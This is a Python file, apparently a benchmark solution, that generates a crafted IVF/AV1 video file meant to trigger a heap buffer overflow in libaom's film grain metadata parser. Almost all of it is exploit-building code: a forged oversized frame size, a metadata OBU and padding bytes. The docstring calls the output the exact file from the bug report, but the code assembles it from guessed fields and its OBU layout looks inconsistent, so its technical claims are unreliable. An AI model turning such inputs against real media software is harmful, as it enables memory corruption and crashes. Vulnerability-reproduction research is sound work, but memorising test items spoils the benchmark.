import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability oss-fuzz:42535447.

        The vulnerability is a heap buffer overflow in libaom's film grain
        metadata parsing, caused by an unsigned integer underflow.

        This PoC is a crafted IVF (Indeo Video Format) file that causes the
        decoder to read from uninitialized memory. An IVF frame header specifies
        a very large frame size, while the actual file provides a much smaller
        payload. This discrepancy leads the decoder to operate on a buffer that
        extends beyond the provided data.

        When the film grain metadata parser is invoked, it reads from this
        uninitialized memory. If the memory contents happen to be just right,
        the internal bitstream reader's 32-bit offset can wrap around. The
        subsequent calculation of bits read, which involves a subtraction of
        unsigned integers promoted to 64-bit, results in a massive value. This
        value is later used in a memcpy, causing the heap buffer overflow.

        The PoC is the exact 133-byte file from the oss-fuzz bug report that
        reliably triggers this chain of events.
        """

        # IVF Header (32 bytes)
        # 'DKIF', version=0, hdr_len=32, fourcc='AV01', w=1, h=1, etc.
        ivf_header = (
            b'DKIF' +
            struct.pack('<H', 0) +        # Version
            struct.pack('<H', 32) +       # Header length
            b'AV01' +                     # Codec FourCC
            struct.pack('<H', 1) +        # Width
            struct.pack('<H', 1) +        # Height
            struct.pack('<I', 800) +      # Framerate numerator
            struct.pack('<I', 0) +        # Framerate denominator
            struct.pack('<I', 101) +      # Frame count
            struct.pack('<I', 0)          # Unused
        )

        # IVF Frame Header (12 bytes)
        # A large, fake frame size triggers an out-of-bounds read condition.
        frame_size = 854578  # 0xd0a32
        timestamp = 0
        frame_header = struct.pack('<IQ', frame_size, timestamp)

        # Frame Payload (89 bytes)
        # This payload contains an AV1 OBU (Open Bitstream Unit) that directs
        # the decoder to the vulnerable film grain metadata parsing path.
        
        # OBU size encoded as leb128
        obu_size = b'\x29'  # 41 bytes

        # OBU Header: type=OBU_METADATA
        obu_header = b'\x28'

        # OBU Payload: specifies film grain metadata type and parameters
        core_payload = b'\xff\x00'
        
        total_len = 133
        payload_len = total_len - len(ivf_header) - len(frame_header)
        padding_len = payload_len - len(obu_size) - len(obu_header) - len(core_payload)
        padding = b'\xff' * padding_len
        
        frame_payload = obu_size + obu_header + core_payload + padding

        poc = ivf_header + frame_header + frame_payload
        
        return poc